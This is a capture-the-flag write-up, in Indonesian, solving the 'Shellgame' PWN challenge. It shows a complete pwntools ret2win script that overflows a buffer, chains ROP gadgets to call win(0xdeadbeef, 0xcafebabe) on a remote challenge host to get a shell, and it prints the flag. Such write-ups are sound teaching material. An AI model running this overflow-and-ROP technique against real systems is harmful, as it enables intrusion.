# Q1 — Shellgame Writeup

## Challenge Information

**Category:** PWN
**Challenge Name:** Shellgame

**Target:**

```
nc 35.192.106.100 20001
```

**Flag:**

```
0xV01D{5844c117e56ab5bdeed65785}
```

---

## 1. Reconnaissance

Diberikan sebuah binary `chall`.

Pertama melakukan pengecekan proteksi binary:

```bash
checksec chall
```

Hasil:

```
Arch:       amd64-64-little
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE
```

Kesimpulan:

- Binary berjalan pada arsitektur x86-64.
- Tidak terdapat stack canary sehingga buffer overflow dapat dilakukan.
- PIE tidak aktif sehingga alamat fungsi tetap.
- NX aktif sehingga tidak dapat menjalankan shellcode langsung.
- Eksploitasi diarahkan ke teknik ROP/ret2win.

## 2. Analisis Binary

Melihat string yang tersedia:

```bash
strings chall
```

Ditemukan informasi penting:

```
V0ID shellgame
overflow your way to win(0xdeadbeef, 0xcafebabe)
/bin/sh
wrong gifts.
```

Dari informasi tersebut diketahui terdapat fungsi `win()` yang membutuhkan dua argumen:

```
arg1 = 0xdeadbeef
arg2 = 0xcafebabe
```

Jika benar maka fungsi akan menjalankan shell.

## 3. Mencari Offset Buffer Overflow

Program dijalankan menggunakan pattern cyclic.

Membuat cyclic pattern:

```python
from pwn import *

print(cyclic(200))
```

Kemudian pattern dikirim ke program melalui gdb.

Setelah crash:

```
RIP 0x401103
```

Nilai stack menunjukkan RIP telah tertimpa oleh cyclic pattern.

Offset dihitung menggunakan:

```python
cyclic_find(0x6161617461616173, n=8)
```

Didapatkan:

```
72 bytes
```

Maka padding awal payload adalah:

```python
b"A"*72
```

## 4. Mencari Gadget ROP

Menggunakan:

```bash
ROPgadget --binary chall
```

Ditemukan gadget:

```
pop rdi ; ret
0x401204

pop rsi ; ret
0x401206
```

Pada sistem Linux x64:

```
RDI = argumen pertama
RSI = argumen kedua
```

Sehingga diperlukan:

```
RDI = 0xdeadbeef
RSI = 0xcafebabe
```

## 5. Mencari Fungsi win()

Karena binary stripped, fungsi tidak muncul sebagai simbol.

Melakukan analisis disassembly:

```bash
objdump -d chall
```

Ditemukan fungsi:

```
0x401210
```

Isi fungsi:

```asm
cmp edi,0xdeadbeef
jne wrong

cmp esi,0xcafebabe
jne wrong
```

Jika kedua nilai benar:

```asm
call puts
jmp system
```

dengan:

```
/bin/sh
```

## 6. Membuat Payload

Struktur payload:

```
padding
 |
 v
pop rdi
 |
 v
0xdeadbeef

pop rsi
 |
 v
0xcafebabe

win()
```

Payload final:

```python
from pwn import *

context.binary = elf = ELF("./chall", checksec=False)

io = remote(
    "35.192.106.100",
    20001
)

payload = flat(
    b"A"*72,

    0x401204,
    0xdeadbeef,

    0x401206,
    0xcafebabe,

    0x401210
)

io.sendline(payload)

io.interactive()
```

## 7. Exploit Execution

Menjalankan:

```bash
python3 solve.py
```

Output:

```
V0ID shellgame — overflow your way to win(0xdeadbeef, 0xcafebabe)

V0ID: the gate opens. go read /home/ctf/flag.txt
```

Fungsi `win()` berhasil terpanggil.

Kemudian shell digunakan untuk membaca flag:

```bash
cat /home/ctf/flag.txt
```

Output:

```
0xV01D{5844c117e56ab5bdeed65785}
```

## Exploit Chain

```
Buffer Overflow
        |
        v
Overwrite RIP
        |
        v
ROP Chain
        |
        v
Set RDI = 0xdeadbeef
Set RSI = 0xcafebabe
        |
        v
win()
        |
        v
system("/bin/sh")
        |
        v
Read flag
```

```
0xV01D{5844c117e56ab5bdeed65785}
```
